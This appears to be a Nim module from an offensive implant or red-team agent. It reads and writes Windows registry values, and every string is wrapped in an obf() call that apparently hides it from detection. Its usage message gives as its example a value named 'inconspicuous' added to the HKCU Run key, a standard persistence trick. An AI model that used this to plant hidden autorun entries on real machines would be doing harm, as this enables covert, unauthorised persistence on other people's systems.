import winregistry
from strutils import join, split, startsWith, replace, toUpperAscii

# Query or modify the Windows registry
proc reg*(args : varargs[string]) : string =

    var
        command : string
        path : string
        key : string
        value : string
        handle : RegHandle

    # Parse arguments
    case args.len:
        of 2:
            command = args[0]
            path = args[1]
        of 3:
            command = args[0]
            path = args[1]
            key = args[2]
        of 4:
            command = args[0]
            path = args[1]
            key = args[2]
            value = args[3 .. ^1].join(obf(" "))
        else:
            result = obf("Invalid number of arguments received. Usage: 'reg [query|add] [path] <optional: key> <optional: value>'. Example: 'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run inconspicuous calc.exe'")
            return

    # Parse the registry path
    try:
        path = path.replace(obf("\\\\"), obf("\\"))

        if command == obf("query") and key == "":
            handle = winregistry.open(path, samRead or samQueryValue)
        elif command == obf("query") and key != "":
            handle = winregistry.open(path, samRead)
        elif command == obf("add"):
            handle = winregistry.open(path, samRead or samWrite)
        else:
            result = obf("Unknown reg command. Please use 'reg query' or 'reg add' followed by the path and value.")
            return
    except OSError:
        result = obf("Invalid registry path. Example path: 'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'.")
        return

    # Query an existing registry value
    if command == obf("query"):
        if key == "":
            for value in handle.enumValueNames():
                result.add("- " & value & obf(": ") & handle.readString(value) & "\n")
        else:
            result = handle.readString(key)

    # Add a value to the registry
    elif command == obf("add"):
        handle.writeString(key, value)
        result = obf("Successfully set registry value.")

    else:
        result = obf("Unknown reg command. Please use 'reg query' or 'reg add' followed by the path and value.")

    close(handle)